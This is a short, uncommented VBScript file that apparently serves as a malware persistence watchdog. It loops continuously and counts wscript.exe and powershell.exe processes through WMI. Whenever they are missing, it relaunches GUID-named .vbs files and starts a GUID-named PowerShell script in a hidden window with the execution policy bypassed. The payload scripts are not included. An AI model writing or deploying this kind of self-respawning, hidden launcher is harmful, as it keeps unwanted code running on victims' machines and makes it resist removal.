Dim objWMIService, colProcesses, processCount, objShell
Dim checkInterval
checkInterval = 1

Do
    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'wscript.exe'")
    processCount = 0
    For Each process In colProcesses
        processCount = processCount + 1
    Next

    Set objShell = CreateObject("WScript.Shell")

    If processCount < 2 Then
        objShell.Run ".\8ae5ba55-53fe-4ce3-a653-28a6accbd50b.vbs"
        objShell.Run ".\6680e652-17f2-40db-b9e3-6b373e09f847.vbs"
    ElseIf processCount = 2 Then
        objShell.Run ".\6680e652-17f2-40db-b9e3-6b373e09f847.vbs"
    End If

    Set colProcesses = objWMIService.ExecQuery("Select * from Win32_Process Where Name = 'powershell.exe'")
    processCount = 0
    For Each process In colProcesses
        processCount = processCount + 1
    Next

    If processCount = 0 Then
        objShell.Run "powershell -ExecutionPolicy Bypass -File """ & ".\917b73f6-ef2b-4cd5-898d-d284dbb2cea6.ps1" & """", 0, True
    End If

    Set objShell = Nothing
    WScript.Sleep checkInterval
Loop
